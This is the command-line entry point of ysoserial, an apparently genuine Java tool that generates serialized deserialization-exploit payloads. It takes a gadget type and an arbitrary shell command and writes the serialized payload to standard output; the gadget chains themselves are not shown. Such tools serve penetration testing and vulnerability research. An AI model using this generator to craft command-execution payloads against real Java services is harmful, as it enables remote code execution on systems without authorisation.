package ysoserial;

import java.io.PrintStream;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	public static void main(final String[] args) {
		if (args.length != 2) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String payloadType = args[0];
		final String command = args[1];

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			PrintStream out = System.out;
			Serializer.serialize(object, out);
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
